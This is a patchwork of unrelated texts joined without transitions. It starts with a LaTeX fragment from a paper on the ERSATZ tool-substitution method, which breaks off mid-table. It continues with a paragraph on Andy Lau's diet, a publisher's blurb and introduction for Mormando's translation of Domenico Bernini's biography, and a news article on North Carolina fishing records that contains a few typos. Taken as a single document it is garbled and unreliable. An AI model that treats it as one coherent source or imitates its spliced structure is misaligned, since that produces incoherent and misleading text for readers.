\\textit{representative physical model} of an object class $O$ such that $ O_{rp} = \\{ p : implies(O, p) \\geq \\theta, p \\in \\textbf{P}_\\eta \\}$\nand $ O_{rf} $ is called as a \\textit{representative functional model} of an object $O$ such that $ O_{rf} = \\{ f : implies(O, f) \\geq \\theta, f \\in \\textbf{F}_\\eta \\}$.\nSimilarly, let $f_d$ be a function model of functional quality $f$, then $f_{rp} $ is called as a \\textit{representative physical model} of a functional quality $f$ such that \n$ f_{rp} = \\{ p : implies(f, p) \\geq \\theta,p \\in \\textbf{P}_\\eta \\}$\n \n\n\\subsubsection{Relevant Qualities}\n\\label{subsubsec:relevant}\n\nDue to the abstract nature of an image schema and by extension a corresponding functional property, it can subsume various purposes of objects, for example,  \na functional property \\textit{support} which can subsume the purposes \\textit{place on, sit on} and \\textit{serve on} of the a table, a chair and a tray respectively.\nIt is suggested in ~\\cite{Baber2003_5} that a certain assemblage of physical properties are essential prerequisites to enable a functional property.\nThus, it can be assumed that by knowing the relevance of one functional property can help identify the relevant physical properties of different objects which are used for different purposes.\n\n\nThe relevance of a representative functional quality is decided by examining whether the physical characterization of the function model of the representative functional quality of a tool are in a close proximity to the physical characterization of a representative physical model of the tool.\nThe close proximity between a functional quality and the object class of the tool is determined using Jaccard Index.\nJaccard Index determines a similarity and dissimilarity between the two sets A and B where the similarity is calculated by dividing the magnitude of the intersection of A and B by the magnitude of the union of A and B. \n\nLet $O_{rp}$ and $f_{rp}$ be the representative physical models of an object class $O$ of the missing tool and of a function model $f_d$ of a representative functional quality $f \\in \\textbf{F}_\\eta$ of the object class $O$ respectively. \nLet $\\phi$ be a \\textit{Minimum Similarity Tolerance} threshold for similarity.\nThen, Jaccard Index of $O_{rp}$ and $f_{rp}$ is computed as:\n$ J(O_{rp}, f_{rp}) = \\frac{\\vert O_{rp} \\cap f_{rp} \\vert}{\\vert O_{rp} \\cup f_{rp} \\vert} $.\nA representative functional quality $f$ of an object class $O$ is regarded as relevant if $J(O_{rp}, f_{rp}) > \\phi$. \nLet $O_{F'}$ be a set of all relevant functional qualities of an object class $O$.\nLet $f_{rp}$ be a representative physical model of a function model $f_d$ of a relevant functional quality $f \\in O_{F'}$.\nLet  $O_{rp}$ be a representative physical model of $O$.\nThen, the relevant physical qualities of an object class $O$, expressed by a set  $O_{P'} = (O_{rp} \\cap f_{rp})$.\n\n\n\n\n\n\n\\subsubsection{Reasoning about a Substitute}\n\\label{subsubsec:substitute}\nLet $O^{\\mu} \\in \\mathbf{O}$ be an object class of a missing tool and let $O^{\\beta} \\in \\mathbf{O}$ be an object class of a possible candidate for a substitute. \nLet $O^{\\mu}_{P'}$ be a set of relevant physical qualities of $O^{\\mu}$ and let $ O^{\\beta}_{rp} $ be a representative physical model of $O^{\\beta}$.\nLet $\\phi$ be a \\textit{Minimum Similarity Tolerance} threshold for similarity.\nThe substitutability of a candidate is determined by measuring the similarity between $O^{\\mu}_{P'}$ and $ O^{\\beta}_{rp} $ using Jaccard's Index. \n$O^{\\beta}$ is termed as a substitute, expressed as $O^{\\beta+}$, if $J(O^{\\mu}_{P'}, O^{\\beta}_{rp}) > \\phi$, else it is regarded as not a substitute and expressed as $O^{\\beta-}$.\nGiven the set of relevant physical qualities $O^{\\mu}_{P'}$, the set of relevant functional qualities $O^{\\mu}_{F'}$ and a positive substitute $O^{\\beta+}$, and a negative substitute $O^{\\beta-}$, a \\textit{substitution model} of $O^{\\mu}$ is expressed as a tuple:\n$ \\langle O^{\\mu}_{P'}, O^{\\mu}_{F'}, O^{\\beta+}, O^{\\beta-} \\rangle $.\nThe knowledge about object $O_{\\mu} \\in \\mathbf{O}$ is then extended in $\\mathbf{O}_{KB}$ to accommodate its substitution model.%\n\n\n\\section{Experimental Evaluation}\n\\label{sec:ex_eval}\nThe objective of the experimental evaluation of ERSATZ is \nto validate the suitability of the substitutes computed by ERSATZ by comparing the results with that of human experts.\nFor the experimental evaluation, we used the images from the Washington Dataset \\cite{Lai2011} to generate human-based and machine-based properties.\nAround $22$ object categories were selected and for each category, we selected random images from all the given instances of the category leading up to total of $692$ images. \nTable \\ref{tab:datasize} illustrates the number of images selected from each category.\nFor the experiment, we generated $22$ queries based on $22$ object categories.\nEach query consisted of a missing tool and $5$ randomly selected objects from which a substitute was to be selected.\nWe gave $22$ queries, %\nto $14$ human experts and asked them to select a substitute in each query. \nThe distribution of the human selections for each scenario is illustrated in Fig. \\ref{fig:toolsub:heat_expert}.\nSimilarly, the queries were run on ERSATZ with the following (heuristically determined) optimal values of the target parameters: i) Number of machine-generated properties is set to $4$ (Sec. \\ref{subsec:know_acqui}), ii) Number of clusters to $4$ (Sec. \\ref{subsubsec:subcategory}),  iii) Representative threshold (Sec. \\ref{subsubsec:representative}) and Minimum Similarity Tolerance (Sec. \\ref{subsubsec:relevant}) to $0.35$.\n\n\n\\begin{table}%\n\t\\caption{Number of scans (\\#) per category ($\\Sigma\\# = 692$)

For example, when he eats meat, he will eat until he is fed by about 70 percent and he is always trying to leave the table with a feeling of slight hunger.\nHowever, the actor stressed that eating in general is important and necessary, but it's important to eat right. Since he and his wife are now vegetarians, they always try to eat more rice and other cereals.\nIn addition, the actor reminded the audience not to eat too much sweets. Eating too much sweet foods will make you look older than your real age much faster than it could happen naturally.\nAlso, Andy Lau in the radio broadcast said that now he is totally happy and enjoys family life. However, with the birth of his daughter five years ago, the actor had to change his way of life.

{"text": "The Life of Gian Lorenzo Bernini\nA Translation and Critical Edition, with Introduction and Commentary, by Franco Mormando\nDomenico Bernini, A critical translation with an introduction and commentary by Franco Mormando\n\"This is the first English translation of Domenico Bernini's important biography of his father and a splendid addition to the literature on the preeminent genius of the Roman Baroque. Not only does Mormando's elegant translation make this primary source available to those who do not read Italian, but his accompanying commentary is illuminating and exhaustive, drawing as it does on nearly six hundred secondary sources. This is the book every student and admirer of Bernini has been waiting for.\"\u2014John Varriano, Mount Holyoke College, author of Caravaggio: The Art of Realism (Penn State, 2006)\nGian Lorenzo Bernini (1598\u20131680), sculptor, architect, painter, and playwright, was the most influential artist of seventeenth-century Rome and, indeed, one of the leading creative forces in European art for most of that century. He is universally recognized as one of the creators of the vastly popular Roman Baroque style, which was quickly disseminated throughout all of Europe. His influence lasted well beyond his death, and the popularity of his numerous works\u2014fountains, statues, churches, and public squares\u2014is today as great as it was during his own lifetime, if not more so. Domenico Bernini (1657\u20131723) was the artist's youngest child. Domenico's full-length biography of his famous father represents one of the most important and most intimate primary sources for the artist's life and work.\nIn this edition, Franco Mormando presents the first critical translation in any language of the complete Italian text, together with annotated translations of two other significant but brief biographical sketches. Mormando provides a lengthy Introduction that closely examines the author and his career, his editorial agenda and critical reception, Baroque biography as a literary genre, the other extant primary sources, and the artistic vocabulary of early modern Europe, among other relevant topics. Extensive commentary accompanies and illuminates the text from a multiplicity of historical, linguistic, and cultural perspectives. This edition is, in effect, a one-volume encyclopedia on the artist's life and work. As such, it stands alone within the immense bibliography of Bernini scholarship.\n\"With this fine volume, all students and scholars of Bernini finally have an essential new tool for seventeenth-century studies\u2014the English translation of the biography of Bernini, which was published in 1713 by his son Domenico. This biography, which emends the better-known vita by Baldinucci, is the more trustworthy of the two with regard to facts and certainly the more informative. No library, no scholar, and no undergraduate in Baroque art can be without Franco Mormando's translation. His introduction and notes are packed with new information and original discoveries. Three loud cheers for Penn State University Press for bringing out a book previously available only in a hard-to-obtain facsimile of the original Italian text.\"\u2014Tod Marder, Rutgers University\n\"Applying his meticulous analysis of Domenico's Life of Gianlorenzo Bernini and drawing on the state of the art in scholarship on Bernini and artistic biography, Franco Mormando not only provides us with an accurate yet highly readable translation of Bernini's biography, but also substantially contributes to our understanding of the text and the myriad issues and themes involved in it. This book is an indispensable working instrument for all those working on Bernini, artistic biography, Baroque Rome, or early modern art theory.\"\u2014Maarten Delbeke, Ghent University and Leiden University\n\"Domenico Bernini's biography of his father, Gian Lorenzo, is a remarkably important textual document. Thanks to Franco Mormando, we now have the definitive English translation we have long been waiting for\u2014a book that will certainly be a welcome addition to the library of any student or scholar of early modern Italian art. Mormando's volume presents an elegant, accurate, and highly readable translation of the text\u2014one that captures the essence and spirit of the original Italian, with respect to the nuances and subtlety of language and terminology. The volume also includes a learned and exhaustive introduction, which frames the biography both historically and critically, and an equally learned and extraordinarily helpful critical commentary, which illuminates the text in myriad ways.\"\u2014Steven F. Ostrow, University of Minnesota\n\"This book immediately becomes an indispensable resource for Bernini studies.\"\u2014A. V. Coonin, Choice\n\"The Life of Gian Lorenzo Bernini translates three invaluable biographical texts on Bernini, complementing them with insightful and extensive explanatory notes. . . . [This book is an] essential [contribution] to Bernini studies, and because of [it], we know Bernini better.\"\u2014Matthew Knox Averett, Renaissance Quarterly\n\"This new critical edition, the product of 10 years of research, effectively puts the lie to much of Domenico's hyperbolic tale of genius, virtue and piety. Crucially, Mormando, a professor of Italian at Boston College, also puts that earlier work into context and with impressive finesse explains the literary conventions and family circumstances underlying Domenico's filial tribute. . . . [This] book will be of special interest to Bernini scholars. Yet serious art aficionados will also find it accessible, thanks less to Domenico's florid prose than to Mormando's helpful introductory essays and vivid commentary.\"\u2014Gregory Waldrop, America: The National Catholic Weekly\n\"Franco Mormando's translation of Bernini's life by his son Domenico is the first in English of Domenico's text which, until recent years, had been considered biased and neither as credible nor as useful to scholars as Baldinucci's 1682 Life of Bernini or Chantelou's observations in his Journal. However Mormando makes a convincing case for Domenico's biography to be taken much more seriously, seeking to prove that a first version may have been written by him many years earlier than the publication date of 1713, so predating Baldinucci's biography, until now thought to be the first.\"\u2014Clare Ford-Wille, The Art Newspaper\nFranco Mormando is Associate Professor of Italian at Boston College.\nA Note on the Commentary, Sources, Translations, Abbreviations, and Currency\nIntroduction: The Anatomy of Baroque Biography: Domenico Bernini's Life of Gian Lorenzo Bernini\nDomenico Bernini, The Life of Gian Lorenzo Bernini\nAppendix 1: Pietro Filippo Bernini (attrib.), The Vita Brevis of Gian Lorenzo Bernini\nAppendix 2: Jean Donneau de Vis\u00e9, \"\u00c9loge du Cavalier Bernin,\" Le Mercure Galant, Paris, January 1681\nThe Anatomy of Baroque Biography: Domenico Bernini's Life of Gian Lorenzo Bernini\nBaroque studies having come into their own in the last generation, the literature on Bernini has become so vast that it is increasingly difficult to keep a check on it. The editor of a textual source is always faced with the problem of how far to go in his commentary; he has to incorporate all new research without making his commentary too heavy and cumbersome.\n\u2014Rudolph Wittkower, 1949\n1. Reading Domenico in the Twenty-first Century\nThis is the first English translation, unabridged, of Domenico Bernini's biography of his famous artist-father, originally published in Rome, 1713, under the title Vita del Cavalier Gio. Lorenzo Bernino descritta da Domenico Bernino suo figlio. It is, in fact, the first translation from the Italian into any language and represents the first new edition of Domenico's work in any form since 1713, apart from simple facsimile reprints issued in recent decades. Given the historical importance of its subject and his celebrity status today\u2014among the general public, Bernini is, after Caravaggio, perhaps the best-known and most popular Italian Baroque artist\u2014one might wonder why it has taken nearly three hundred years for this unique and indispensable primary source to make a more widely accessible reappearance in print. After all, Filippo Baldinucci's Life of Bernini, first published in 1682 and written by a \"foreigner\" from Florence who had never even met Bernini, was reedited twice in the twentieth century and received its English translation (recently reprinted) over forty years ago. Why the neglect of a biography written by the artist's own son?\nThe reasons for this seemingly strange state of affairs will be described in the pages that follow: the vicissitudes of Domenico's Life of Gian Lorenzo Bernini is, one could say, the case of a literary \"ugly duckling\" transformed into a handsome swan. Also conveyed in these introductory pages is the most important background information necessary for a more profitable reading of this Baroque biography by a twenty-first-century audience. In contrast, the individual notes appended to the text will comment on the specific data and assertions encountered in Domenico's narrative, completing, correcting, or corroborating his information by means of reliable contemporary documentation, as well as offering more recent alternative interpretations of the facts and events. Regarding those facts and events, at the beginning of chapter 1, Domenico makes what appears to be a reassuringly modern claim about historical accuracy:\nIt is our intention, therefore, to record in the present work the life of this illustrious personage, whom talent [virt\u00f9] alone rendered glorious and celebrated throughout the world. It is, furthermore, our intention to do so with that accuracy demanded of all those who describe events to which almost everyone still alive today has been an eyewitness. Such eyewitnesses could easily contradict an author each time he, in order to garner more admiration for his writing, embellishes the facts and departs from the truth, for truth is the sole merit of history and history is truth alone.\nHowever, as this Introduction and subsequent notes to the text will make clear, what Domenico considers historical accuracy at times turns out to be something quite less than that. This is occasionally because of the sheer lack of information on his part, but even more frequently, because of his pious need to cast Bernini in the best light possible. No less determinant in the shaping of Domenico's account of his father's life is the fundamental nature of all early modern biography, especially art biography: as modern scholarship has by now amply demonstrated, a good deal of such biography in fact represents not \"truth alone\" but, rather, the more or less fictionalized recasting of the historical data in accordance to the dictates of literary-rhetorical convention and with recourse to an abundant supply of time-honored thematic commonplaces. Why all of this recasting and manipulation? To make the biographical narrative conform to contemporary expectations of how the life of (in this case) an artist should unfold and how that artist, especially a great one like Bernini, should think, feel, and act. As Philip Sohm reminds us, \"Early modern biographies elide the boundaries between fact and fiction in order to conceptualize the category of artist and to mythologize individual artists.\" In this, literary biography was similar to the sculpted portraiture of the age: not only must the sculptor capture the likeness of the sitter as he was as an individual, but the artist must also confer about the bust those qualities pertaining to the sitter's official state in life\u2014pope, king, prince, or prelate\u2014whether he genuinely possessed them or not. As Bernini says in Paris about the challenge of creating his portrait of Louis XIV, \"[I]n this kind of head one must bring out the qualities of a hero as well as make a good likeness.\" Equally determinant of the content and tone of early modern art biography is its essential nature as a form of the rhetorical genre of panegyric: accordingly, the fundamental purpose of the artist's vita is to praise its subject and to offer to the reader inspiring examples of exceptional human achievement.\nNonetheless, as Sohm also observes, \"Historical truth can coexist with mythologized biography.\" And so it does in the present Life of Gian Lorenzo Bernini, even if Domenico's principal goal is by no means to furnish a complete, detailed account of the basic historical facts regarding his father's life and works. The Life of Gian Lorenzo Bernini is an engaging, at times even entertaining, story that is for the most part intelligently composed and skillfully written with the goal of informing, delighting, and capturing the allegiance of the reader. Despite the mythologizing to which Bernini's curriculum vitae and personality have been subjected by Domenico, his narrative, nonetheless, conveys much correct information, as we find confirmed by other primary sources. It is, furthermore, an extensive record of what were most likely often-repeated anecdotes and assertions\u2014valid or otherwise\u2014from the mouth of Gian Lorenzo himself, all or most of which no doubt were heard by the author at the family dinner table and other household gatherings. It thus represents a valuable source of information and insight for us today. Yet Domenico's text does require a careful, discerning approach by modern readers: as in his father's art, so too in Domenico's biography, appearances can often be deceiving, and not all that he says can be taken at face value. Indeed, what Domenico describes as a central characteristic of his father's theatrical-artistic talent is at times the case with his own editorial comportment, that is, it sometimes \"consist[s] in making what is, in fact, artificial [finto], appear real\" (Domenico, 57). Again, Domenico's Life of Gian Lorenzo Bernini, like all Baroque biographies, is a product of a specific, now remote, age and \"mentality,\" constructed upon philosophical premises, literary conventions, and rhetorical mechanisms alien, if not inimical, to our own practice of the art of history and its subsidiary genre, biography.

{"text": "Home Resources Industry News Three N.C. Fishing Records Fall During June\nThree N.C. Fishing Records Fall During June\nTwo World Records Pending\nCapt. Jerry Dilsaver\nTwo N.C. state fishing records have fallen in the month of June, with another pending. The big fish from one of the records recognized by N.C. is also pending as not just one, but two, IGFA World Records. While some species are currently in downturns, there are some bright spots in fishing in the Tar Heel state. These are several of them. Congratulations to all the anglers.\nBenson Teen Catches 117.5 Pound Blue Catfish\nLandon Evans of Benson is a teenager that really likes to fish and especially for catfish. His diligence, knowledge and effort were rewarded on June 11 when he landed a huge 117.5 pound blue catfish that smashed the N.C. record by 12.5 pounds. As if the feat wasn't difficult enough on its own, Evans added the difficulty factor of doing it from a dock.\nLandon Evans 117.5 Catchfish\nThis is the third state record catfish caught in Lake Gaston in six months. The record Evans broke was set by Lake Gaston guide Zakk Royce in December. Evans said Royce has helped him with his catfishing skills and was a big help getting this fish certified as the N.C. state record. Evans has also submitted applications to the IGFA (International Game Fish Association) for the Junior Angler Blue Catfish World Record and the 30 Pound Line Cass World Record.\nEvans felt good about fishing the night of June 11 because he had caught a gizzard shard to use for bait and they are considered excellent baits. He was fishing a catfish outfit on one side of the dock with a Carolina rig on a bass rod on the other. As many big fish seem to have the knowledge to do, the big catfish hit the bait on the lighter Rapala bass rod with a Shimano Catala 300 reel and 30 pound Suffix line.\nEvans said he has caught a fair number of 30 to 40 pound catfish from this same dock and he knew immediately this fish was larger. After fighting it a while, it came to the surface and rolled and he realized it was larger than the 50 to 60 pounds he was thinking.\nEvans called for someone to help him net the fish. His mother came first and then his father. He would need both.\nWhen the fish finally rolled up beside the dock, his parents netted it from both ends just as the seriously overmatched rod broke. His dad pulled the hoops of the nets together, but couldn't pull the fish onto the dock. With the help of young Evans and his Mon, they finally rolled the big catfish onto the dock. The estimate of the fish's weight increased again.\nThe next step was to try to weigh it on a set of 100 pound digital scales. The Evans family couldn't get the big fish all the way off the ground and still got readings of 103 and 106 pounds. Landon Evans knew the state record was 105 pounds and if these scales were anywhere near accurate, his fish should weigh more.\nThey hastily rigged a kiddie pool and aerator to try to keep the fish alive overnight so they could weigh it the next day. Unfortunately it didn't survive, but that made it easier to handle, even though they didn't have a cooler large enough to hold it.\nThe next morning Landon Evans and his dad packed the catfish in their largest cooler and wrapped the exposed tail in wet towels, to head out to find scales to weigh it. That was easier said than done. They found a scale at Holly Grove Marina on the Virginia side of the lake and the fish weighed 120 pounds on their non certified scales, but they needed certified N.C. scales..\nAt this point Evans called the current record holder, Royce, and asked for advice. He said Royce was very helpful and also congratulated him on his catch. Evans downloaded the state record application and began trying to contact a biologist.\nit was Monday morning before Evans was able to talk with Evans Cartabiano, N.C. Wildlife Resources Commission Biologist for the area. They met at the Ace Hardware in Littleton where Cartabiano examined the fish and witnessed the weighing on the propane scales for the store. Interestingly enough, this is where Royce's record had been weighed and Cartabiano was the certifying biologist on it too.\nIt took a few days for all the paperwork to be processed, but Landon Evans now holds the N.C. state record for blue catfish at 117.5 pounds. This weight surpassed the IGFA Junior World Record (109 pounds) by 8.5 pounds and the 30 Pound Line Class Record (111 pounds) by 6.5 pounds. The application and certification process for IGFA world records is a bit more complex than for the state record, but they have been submitted and Evans hopes to hear they have been approved soon.\nBrandon Evans, Landon's father said he was really proud of his son and while finding certified scales with enough capacity and a biologist to verify the species had been a bit frustrating at times, he was really glad they had seen the process through. He also laughed as he said he thought the catfish also deserved a record for the most miles traveled in a truck as they rode it around for a day and a half getting everything done correctly.\nEvans' catfish was 55 inches long and 40.5 inches in girth. Following the widely accepted formula for approximating weight of using girth squared, multiplied by length, and divided by 800, this computes to 112.767 pounds, which is within 5 percent of its actual weight of 117.5 pounds.\nSavvy catfish anglers are now wondering if N.C. might have a new trophy fishery for blue catfish. This is the third state record blue catfish caught in Lake Gaston in six months. It seems pretty obvious some big cats live there.\nValdese Angler Breaks Skipjack Tuna Record\nTim Street \u2013 32.5 \u2013 Skipjack\nWhen Tim Street of Valdese made the long drive to Hatteras in late May, he hoped to come home with a cooler full of dolphin, wahoo and tuna fillets. He accomplished that well and also returned with a pending state record for skipjack tuna. Street fished with Capt. Rom Whitaker on the Release on May 24 and landed a 32.5 pound skipjack tuna that was a half pound heavier than the current record caught in 2014 by Matthew Kelly.\nThis was Street's first offshore fishing trip and it took two tries to get it done. The first attempt in 2015 had been blown out and they weren't able to reschedule until this year.\nThe dolphin bite was in full swing, with a few tuna and wahoo around. They caught dolphin in spades \u2013 32 of them to be exact, including one big bull that weighed 48 pounds. They also caught and released a blue marlin Capt. Whitaker estimated at 150 pounds and a sailfish. The record skipjack was indeed the icing atop an already delicious cake.\nStreet was on the reel when a pair of tuna hit. The other one ran a little longer, but pulled the hook. Capt. Whitaker said he thought they were 50 pound class yellowfins the way they were running.\nWith his son and friends offering encouragement and Release mate Andy Trant giving directions, Street stayed on the reel and cranked, even though his muscles were screaming. Street finally led the tuna to the transom where Trant gaffed it and slung it over the rail and onto the cockpit deck.\nEveryone was surprised at the fight in a fish of this size. Capt. Whitaker and Trant were surprised it wasn't a fat yellowfin. It was fat, but not the species they expected to see. Both said it was by far the largest skipjack they had ever seen.\nWhitaker said most of the skipjacks they caught were in the 10 pound range and this one was much , much larger and they should weigh it. Once they were close enough to land to have cell phone service, Street's son checked on his phone to find the state record was the 32 pounder caught by Matthew Kelly in 2014. All thought Street's fish would be close to that and might weigh more.\nThere was a big marlin hanging in the scales at Hatteras Harbor Marina with lots of people taking their pictures with it and Street had to wait a while for marina staff to lower the marlin and weigh his fish. He admitted to getting antsy during the wait as he was wondering how much weight it had lost since being caught.\nWhen the scales settled at 32.5 pounds Street and his friends gave a collective sigh and a celebratory yell. Street said it was a good feeling.\nCapt. Whitaker said they had moved off the break to deeper water when the skipjack hit an outrigger bait and began taking line like a much larger fish. Just a few seconds later, something hit the other long rigger and took off too. He said both headed down and he thought it might be a pair of yellowfins. He didn't think something running that hard would be a skipjack.\nStreet's skipjack was recognized as the state record on June 21. It was 37 inches long to the fork of its tail and 25 inches in girth. The tuna hit a ballyhoo rigged into a blue and white sea witch on a wind on leader of 25 feet of 80 pound fluorocarbon ending at an 8/0 Mustad 7691 welded eye tuna hook. The reel was a Penn 70 International loaded with 80 pound line and mounted on a Penn 50 International boat rod.\nRocky Mount Fisherman Catches Pending State Record Pigfish\nJason Edwards \u2013 2.75 Pigfish\nJason Edwards of Rocky Mount was fishing on the Capt. Stacy IV on May 23 when he caught a 2, pound and 12 ounce pigfish that is the pending N.C. state record. The information and species were verified by Division of Marine Fisheries Staff and sent to the N.C. Saltwater Tournament Committee for approval on June 22. The current record is a 2 pound, 4 ounce pigfish caught by Walter M. Campbell in 1991.\nEdwards was fishing cut squid on the bottom when the fish hit. They were approximately 30 miles southeast of Beaufort Inlet. He was fishing a Penn 66 reel spooled with 80 pound line.\nThe pigfish was 15.5 inches long and 14 inches in girth. It was weighed at the Capt. Stacy Fishing Center in Atlantic Beach. Expectations are for the record to be approved in late June.\n117.5 Pound Blue Catfish\nJason Edwards\nLandon Evans\nN.C.
